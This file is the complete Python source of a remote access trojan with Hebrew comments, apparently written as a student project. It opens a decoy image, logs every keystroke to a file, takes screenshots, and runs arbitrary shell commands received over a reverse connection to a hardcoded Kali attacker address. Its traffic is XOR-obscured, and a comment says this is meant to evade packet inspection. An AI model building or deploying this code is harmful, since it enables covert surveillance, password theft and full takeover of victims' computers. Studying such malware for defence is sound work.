#@setlocal enabledelayedexpansion && python -x "%~f0" %* && exit /b
import socket
import json
import os
import sys
import time
import threading
import hashlib
import base64
import io
import subprocess
from pynput.keyboard import Listener
from PIL import ImageGrab

# --- הגדרות חיבור ---
# וודא שה-IP מעודכן לכתובת של מכונת ה-Kali שלך
SERVER_HOST = "192.168.1.140" 
SERVER_PORT = 8080
# מפתח פשוט להצפנת XOR כדי לעקוף זיהוי בסיסי של חבילות מידע
KEY = b'simple_xor_key'

# פונקציית הצפנה/פענוח XOR
def xor_crypt(data: bytes) -> bytes:
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))

# פונקציה לשליחת הודעות מובנות (JSON) מוצפנות
def send_msg(sock, obj):
    try:
        raw = json.dumps(obj).encode()
        enc = xor_crypt(raw)
        # שליחת אורך ההודעה ב-4 הבייטים הראשונים
        length = len(enc).to_bytes(4, 'big')
        sock.sendall(length + enc)
    except: pass

# פונקציה לקבלת הודעות ופענוחן
def recv_msg(sock):
    length_bytes = sock.recv(4)
    if not length_bytes: raise ConnectionError()
    length = int.from_bytes(length_bytes, 'big')
    data = b''
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk: raise ConnectionError()
        data += chunk
    dec = xor_crypt(data)
    return json.loads(dec.decode('latin-1'))

# פונקציה לחישוב SHA256 של קובץ (דרישת פרויקט)
def handle_hash(sock, filename):
    try:
        target = filename if filename else "logs.txt"
        if not os.path.exists(target):
            send_msg(sock, {"result": f"[-] Error: {target} not found."})
            return
        h = hashlib.sha256()
        with open(target, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                h.update(chunk)
        send_msg(sock, {"result": f"[+] SHA256 ({target}): {h.hexdigest()}"})
    except Exception as e:
        send_msg(sock, {"result": f"[-] Hash error: {str(e)}"})

# פונקציה לצילום מסך ושליחתו כטקסט Base64
def handle_screencap(sock):
    try:
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG")
        img_str = base64.b64encode(buffer.getvalue()).decode()
        send_msg(sock, {"result": "[+] Screenshot captured!", "data": img_str})
    except Exception as e:
        send_msg(sock, {"result": f"[-] Screenshot failed: {e}"})

# פונקציית Keylogger - הקלטת הקשות ושמירתן לקובץ מקומי
def start_keylogger():
    def on_press(key):
        with open("logs.txt", "a") as f:
            f.write(f"{key} ")
    with Listener(on_press=on_press) as listener:
        listener.join()

# הלוגיקה המרכזית של החיבור והסוואת התמונה
def connecting():
    # פתיחת תמונת ההסוואה במידה והיא קיימת בתיקייה
    if os.path.exists("image.jpg"):
        subprocess.Popen("start image.jpg", shell=True)

    while True:
        try:
            # ניסיון התחברות לשרת (ה-Kali)
            s = socket.socket()
            s.connect((SERVER_HOST, SERVER_PORT))
            
            while True:
                msg = recv_msg(s)
                action = msg.get("action")

                # פקודת יציאה וסגירת התהליך
                if action == "terminate":
                    s.close()
                    os._exit(0)
                
                # קבלת לוג ההקשות מהקובץ
                elif action == "keylog":
                    if os.path.exists("logs.txt"):
                        with open("logs.txt", "r") as f:
                            send_msg(s, {"result": f.read()})
                    else:
                        send_msg(s, {"result": "[-] No logs found."})
                
                # הפעלת צילום מסך
                elif action == "screencap":
                    handle_screencap(s)
                
                # הפעלת חישוב Hash
                elif action == "hash":
                    handle_hash(s, msg.get("filename"))
                
                # הרצת פקודות מערכת (Shell) וקבלת הפלט
                else:
                    proc = subprocess.Popen(action, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = proc.stdout.read() + proc.stderr.read()
                    send_msg(s, {"result": result.decode('latin-1')})
        except:
            # במידה והשרת לא זמין, המתנה של 10 שניות וניסיון חוזר
            time.sleep(10)

# פונקציית הכניסה הראשית
def main():
    # הרצת ה-Keylogger ב-Thread (תהליכון) נפרד כדי שלא יעצור את התקשורת
    t = threading.Thread(target=start_keylogger, daemon=True)
    t.start()
    # התחלת לוגיקת החיבור
    connecting()

if __name__ == "__main__":
    main()